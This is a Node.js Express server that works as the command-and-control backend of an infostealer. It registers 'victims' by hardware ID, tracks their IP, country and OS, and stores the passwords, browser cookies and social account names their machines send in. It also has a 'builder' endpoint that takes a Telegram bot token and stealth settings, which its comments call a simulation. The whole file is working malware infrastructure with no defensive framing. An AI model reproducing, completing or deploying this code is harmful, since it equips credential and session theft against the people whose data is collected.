const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const multer = require('multer');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Multer for file uploads (for builder simulation)
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'downloads/');
  },
  filename: (req, file, cb) => {
    cb(null, file.originalname);
  }
});
const upload = multer({ storage });

// Initialize SQLite database
const db = new sqlite3.Database(':memory:', (err) => {
  if (err) {
    console.error(err.message);
  }
  console.log('Connected to the in-memory SQLite database.');
});

// Create tables
db.serialize(() => {
  // Victims table
  db.run(`CREATE TABLE victims (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hwid TEXT UNIQUE NOT NULL,
    computer_name TEXT NOT NULL,
    ip_address TEXT,
    country_code TEXT,
    os_version TEXT,
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    first_seen DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  // Passwords table
  db.run(`CREATE TABLE passwords (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id INTEGER NOT NULL,
    url TEXT,
    username TEXT,
    password TEXT,
    application TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (victim_id) REFERENCES victims(id)
  )`);

  // Cookies table
  db.run(`CREATE TABLE cookies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id INTEGER NOT NULL,
    domain TEXT,
    name TEXT,
    value TEXT,
    application TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (victim_id) REFERENCES victims(id)
  )`);

  // Social accounts table
  db.run(`CREATE TABLE social_accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id INTEGER NOT NULL,
    platform TEXT NOT NULL,
    account_name TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (victim_id) REFERENCES victims(id)
  )`);
});

// Helper function to get victim ID by HWID
function getVictimIdByHwid(hwid, callback) {
  db.get('SELECT id FROM victims WHERE hwid = ?', [hwid], (err, row) => {
    if (err) {
      callback(err, null);
    } else {
      callback(null, row ? row.id : null);
    }
  });
}

// API Endpoints

// Register victim
app.post('/api/victim/register', (req, res) => {
  const { hwid, computer_name, ip, country, os } = req.body;
  
  if (!hwid || !computer_name) {
    return res.status(400).json({ error: 'HWID and computer_name are required' });
  }

  // Check if victim already exists
  db.get('SELECT id FROM victims WHERE hwid = ?', [hwid], (err, row) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }

    if (row) {
      // Update existing victim
      const stmt = db.prepare('UPDATE victims SET computer_name = ?, ip_address = ?, country_code = ?, os_version = ?, last_seen = CURRENT_TIMESTAMP WHERE hwid = ?');
      stmt.run([computer_name, ip, country, os, hwid], function(err) {
        if (err) {
          return res.status(500).json({ error: err.message });
        }
        res.json({ status: 'ok', victim_id: row.id });
      });
      stmt.finalize();
    } else {
      // Insert new victim
      const stmt = db.prepare('INSERT INTO victims (hwid, computer_name, ip_address, country_code, os_version) VALUES (?, ?, ?, ?, ?)');
      stmt.run([hwid, computer_name, ip, country, os], function(err) {
        if (err) {
          return res.status(500).json({ error: err.message });
        }
        res.json({ status: 'ok', victim_id: this.lastID });
      });
      stmt.finalize();
    }
  });
});

// Heartbeat endpoint
app.post('/api/victim/heartbeat', (req, res) => {
  const { hwid } = req.body;
  
  if (!hwid) {
    return res.status(400).json({ error: 'HWID is required' });
  }

  const stmt = db.prepare('UPDATE victims SET last_seen = CURRENT_TIMESTAMP WHERE hwid = ?');
  stmt.run([hwid], function(err) {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    
    if (this.changes === 0) {
      return res.status(404).json({ error: 'Victim not found' });
    }
    
    res.json({ status: 'ok' });
  });
  stmt.finalize();
});

// Receive passwords
app.post('/api/data/passwords', (req, res) => {
  const { hwid, passwords } = req.body;
  
  if (!hwid || !passwords || !Array.isArray(passwords)) {
    return res.status(400).json({ error: 'HWID and passwords array are required' });
  }

  getVictimIdByHwid(hwid, (err, victimId) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    
    if (!victimId) {
      return res.status(404).json({ error: 'Victim not found' });
    }

    let count = 0;
    const stmt = db.prepare('INSERT INTO passwords (victim_id, url, username, password, application) VALUES (?, ?, ?, ?, ?)');
    
    passwords.forEach(pwd => {
      stmt.run([victimId, pwd.url, pwd.username, pwd.password, pwd.application]);
      count++;
    });
    
    stmt.finalize((err) => {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ status: 'ok', count: count });
    });
  });
});

// Receive cookies
app.post('/api/data/cookies', (req, res) => {
  const { hwid, cookies } = req.body;
  
  if (!hwid || !cookies || !Array.isArray(cookies)) {
    return res.status(400).json({ error: 'HWID and cookies array are required' });
  }

  getVictimIdByHwid(hwid, (err, victimId) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    
    if (!victimId) {
      return res.status(404).json({ error: 'Victim not found' });
    }

    let count = 0;
    const stmt = db.prepare('INSERT INTO cookies (victim_id, domain, name, value, application) VALUES (?, ?, ?, ?, ?)');
    
    cookies.forEach(cookie => {
      stmt.run([victimId, cookie.domain, cookie.name, cookie.value, cookie.application]);
      count++;
    });
    
    stmt.finalize((err) => {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ status: 'ok', count: count });
    });
  });
});

// Get all victims with stats
app.get('/api/victims', (req, res) => {
  const { search, sort } = req.query;
  
  let sql = `
    SELECT 
      v.id,
      v.hwid,
      v.computer_name,
      v.ip_address,
      v.country_code,
      v.os_version,
      v.last_seen,
      v.first_seen,
      COUNT(DISTINCT p.id) AS passwords_count,
      COUNT(DISTINCT c.id) AS cookies_count,
      GROUP_CONCAT(DISTINCT sa.platform) AS social_accounts
    FROM victims v
    LEFT JOIN passwords p ON v.id = p.victim_id
    LEFT JOIN cookies c ON v.id = c.victim_id
    LEFT JOIN social_accounts sa ON v.id = sa.victim_id
  `;
  
  const params = [];
  let whereClause = '';
  
  if (search) {
    whereClause += `WHERE v.computer_name LIKE ? OR v.ip_address LIKE ? OR v.os_version LIKE ? `;
    const searchParam = `%${search}%`;
    params.push(searchParam, searchParam, searchParam);
  }
  
  sql += whereClause;
  sql += `GROUP BY v.id `;
  
  if (sort) {
    const validSortColumns = ['computer_name', 'ip_address', 'os_version', 'last_seen'];
    const direction = sort.startsWith('-') ? 'DESC' : 'ASC';
    const column = sort.replace('-', '');
    
    if (validSortColumns.includes(column)) {
      sql += `ORDER BY v.${column} ${direction} `;
    }
  } else {
    sql += `ORDER BY v.last_seen DESC `;
  }
  
  db.all(sql, params, (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    
    // Process social accounts into arrays
    const processedRows = rows.map(row => {
      return {
        ...row,
        social_accounts: row.social_accounts ? row.social_accounts.split(',') : []
      };
    });
    
    res.json({ victims: processedRows });
  });
});

// Get statistics
app.get('/api/stats', (req, res) => {
  const sql = `
    SELECT 
      (SELECT COUNT(*) FROM victims) AS total_victims,
      (SELECT COUNT(*) FROM passwords) AS total_passwords,
      (SELECT COUNT(*) FROM cookies) AS total_cookies,
      (SELECT COUNT(*) FROM social_accounts) AS total_social
  `;
  
  db.get(sql, (err, row) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    
    res.json(row);
  });
});

// Builder endpoint (simulation)
app.post('/api/builder/build', (req, res) => {
  const { telegram_token, telegram_chat_id, capture_passwords, capture_cookies, stealth_mode } = req.body;
  
  if (!telegram_token || !telegram_chat_id) {
    return res.status(400).json({ error: 'Telegram token and chat ID are required' });
  }
  
  // Generate a unique ID for this build
  const buildId = crypto.randomBytes(8).toString('hex');
  const fileName = `payload_${buildId}.txt`;
  const filePath = path.join(__dirname, 'downloads', fileName);
  
  // Create a config file with the settings
  const configFileContent = JSON.stringify({
    telegram_token,
    telegram_chat_id,
    capture_passwords: capture_passwords !== false,
    capture_cookies: capture_cookies !== false,
    stealth_mode: stealth_mode !== false,
    build_date: new Date().toISOString()
  }, null, 2);
  
  // In a real implementation, we'd write the config to a file
  // For this demo, we'll just simulate it
  res.json({ 
    status: 'ok', 
    download_url: `/downloads/${fileName}`,
    message: 'Configuration saved. In a real system, this would trigger a build.' 
  });
});

// Serve static files
app.use('/public', express.static('public'));
app.use('/downloads', express.static('downloads'));

// Handle 404
app.use((req, res) => {
  res.status(404).send('Not Found');
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});